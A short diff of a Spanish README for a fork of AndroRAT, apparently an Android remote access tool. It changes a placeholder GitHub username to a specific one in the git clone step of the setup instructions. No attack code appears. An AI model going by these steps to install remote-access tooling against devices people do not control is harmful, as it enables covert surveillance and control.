@@ -56,7 +56,7 @@ python --version
 
 ```bash
 # Clonar este fork
-git clone https://github.com/TU_USUARIO/AndroRAT.git
+git clone https://github.com/Darkrevengehack/AndroRAT.git
 cd AndroRAT
 
 # Instalar dependencias
